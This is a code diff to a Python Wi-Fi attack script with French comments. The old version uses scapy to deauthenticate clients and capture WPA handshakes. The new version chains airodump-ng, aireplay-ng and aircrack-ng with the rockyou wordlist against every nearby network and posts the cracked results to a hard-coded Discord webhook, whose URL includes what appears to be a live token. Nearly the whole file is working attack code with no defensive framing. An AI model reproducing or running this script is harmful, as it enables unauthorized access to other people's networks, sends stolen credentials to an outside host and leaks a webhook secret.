@@ -1,103 +1,71 @@
 import os
-import json
-import threading
+import subprocess
+import discord
+from discord.ext import commands
 from scapy.all import *
+import time
 
-# Initialisation des variables
-networks = []
-eapol_count = 0
-captured = False
-
-
-def write_networks():
-    try:
-        with open("wifi_networks.json", "w") as f:
-            json.dump(networks, f, indent=4)
-    except Exception as e:
-        print(f"Error writing to JSON file: {e}")
+# Configuration
+INTERFACE = "wlan1"  # Interface Wi-Fi à utiliser
+ROCKYOU_TXT = "rockyou.txt"  # Chemin vers le dictionnaire rockyou.txt
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1295144722633068544/8Ul3DDQNNGJ3ljMSTLy24ddAaLqTbyHumRQmWaU0dwutVYbYG7U6x5Fi1cYQam5tYkba"  # Webhook Discord
 
 
-def WifiEnumeration(packet):
-    global networks
-    if packet.haslayer(Dot11Beacon):
-        bssid = packet[Dot11].addr2
-        ssid = packet[Dot11Elt].info.decode()
-
-        stats = packet[Dot11Beacon].network_stats()
-        channel = stats.get("channel")
-        crypto = stats.get("crypto")
-
-        # Check if crypto is a list or set, convert to list if necessary
-        if isinstance(crypto, set):
-            crypto = list(crypto)
-
-        if "WPA/PSK" in crypto or "WPA2/PSK" in crypto:
-            data = {"ssid": ssid, "bssid": bssid, "channel": channel, "crypto": crypto}
-            networks.append(data)
+# Fonction pour capturer les réseaux Wi-Fi
+def capture_wifi():
+    print("Capture des réseaux Wi-Fi...")
+    output = subprocess.check_output(["airodump-ng", INTERFACE]).decode()
+    return output
 
 
-def deauth_attack(ap_mac, channel):
-    try:
-        os.system(f"iwconfig wlan1 channel {channel}")
-        packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac,
-                                    addr3=ap_mac) / Dot11Deauth()
-
-        for i in range(1000):
-            send(packet, iface="wlan1", verbose=0)
-    except Exception as e:
-        print(f"Error performing deauthentication attack: {e}")
+# Fonction pour déauthentifier les clients
+def deauth_clients(bssid):
+    print(f"Déauthentification des clients sur le réseau {bssid}...")
+    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, INTERFACE])
 
 
-def WPAhandshake(packet):
-    global eapol_count, captured
-    pktdump = PcapWriter("tmp/handshake.pcap", append=True, sync=True)
-    pktdump.write(packet)
-
-    if (EAPOL in packet):
-        eapol_count += 1
-    if eapol_count >= 10:
-        captured = True
-        return captured
+# Fonction pour récupérer les handshakes
+def get_handshakes(bssid, ssid):
+    print(f"Récupération des handshakes pour le réseau {ssid}...")
+    subprocess.run(["airodump-ng", "-w", ssid, "--bssid", bssid, INTERFACE])
 
 
-def capture_handshake(ap_mac, channel):
-    global captured
-    sniff(stop_filter=WPAhandshake, iface="wlan1", monitor=True, timeout=20)
-    return captured
+# Fonction pour cracker les handshakes
+def crack_handshakes(ssid):
+    print(f"Crack des handshakes pour le réseau {ssid}...")
+    results = subprocess.run(["aircrack-ng", "-w", ROCKYOU_TXT, "-b", ssid + "-01.cap"], capture_output=True, text=True)
+    return results.stdout
 
 
-def read_saved_networks():
-    try:
-        with open("wifi_networks.json", "r") as f:
-            return json.loads(f.read())
-    except Exception as e:
-        print(f"Error reading from JSON file: {e}")
-        return []
+# Fonction pour envoyer les résultats sur Discord
+def send_results(results):
+    print("Envoi des résultats sur Discord...")
+    webhook = discord.Webhook.from_url(DISCORD_WEBHOOK, adapter=discord.RequestsWebhookAdapter())
+    webhook.send(results)
+
+
+# Programme principal
+def main():
+    wifi_output = capture_wifi()
+
+    # Extraire les BSSID et les SSID des réseaux (cette partie doit être adaptée selon le format de sortie de airodump-ng)
+    bssids = []  # Liste pour stocker les BSSID
+    ssids = []  # Liste pour stocker les SSID
+    for line in wifi_output.splitlines():
+        if "BSSID" in line:  # Assurez-vous que la ligne contient les BSSID
+            continue
+        parts = line.split()  # Divisez la ligne pour extraire les informations
+        if len(parts) > 0 and parts[0].count(':') == 5:  # Vérifiez si la ligne commence par un BSSID
+            bssids.append(parts[0])  # Ajoutez le BSSID à la liste
+            ssids.append(parts[13])  # Ajoutez le SSID à la liste
+
+    for bssid, ssid in zip(bssids, ssids):
+        deauth_clients(bssid)
+        time.sleep(5)  # Attendez un peu pour permettre la déconnexion
+        get_handshakes(bssid, ssid)
+        results = crack_handshakes(ssid)
+        send_results(results)
 
 
 if __name__ == "__main__":
-    sniff(prn=WifiEnumeration, iface="wlan1", timeout=5)
-    write_networks()
-
-    saved_networks = read_saved_networks()
-
-    for net in saved_networks:
-        ap_mac = net['bssid']
-        channel = net['channel']
-        ssid = net['ssid']
-        print(f"Trying to deauthenticate {ssid}..")
-
-        print(f"AP MAC : {ap_mac}")
-        print(f"Channel : {channel}")
-
-        deauther = threading.Thread(target=deauth_attack, args=(ap_mac, channel))
-        deauther.daemon = True
-        deauther.start()
-
-        # Pass ap_mac and channel to the capture_handshake function
-        captured = capture_handshake(ap_mac, channel)
-
-        deauther.join()
-
-        if captured:
-            print("4-way handshake captured")
+    main()
